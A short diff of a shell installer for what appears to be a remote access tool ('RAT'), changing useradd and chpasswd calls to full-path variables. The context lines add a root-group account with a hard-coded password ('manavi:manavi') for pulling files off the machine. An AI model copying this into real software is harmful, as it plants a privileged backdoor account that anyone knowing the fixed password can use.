@@ -5,6 +5,8 @@ LOG_FILE=$RAT_DIR/rat.log
 
 MODPROBE=/sbin/modprobe
 INSMOD=/sbin/insmod
+USERADD=/usr/sbin/useradd
+CHPASSWD=/usr/sbin/chpasswd
 PYTHON279_PREFIX=/usr/local/lib/
 PYTHON279=${PYTHON279_PREFIX}python2.7.9/bin/python
 
@@ -49,8 +51,8 @@ cd $RAT_DIR
 echo "root $$" > /proc/buddyinfo 2>/dev/null
 
 #Crear el usuario con el desde el cual se obtendrán los archivos
-useradd $RAT_USER -d /home/$RAT_USER/ -M -s /bin/false -G root
-echo manavi:manavi | chpasswd
+$USERADD $RAT_USER -d /home/$RAT_USER/ -M -s /bin/false -G root
+echo manavi:manavi | $CHPASSWD
 
 #Se instalan todas las dependencias
 apt-get -y install imagemagick 1>/dev/null
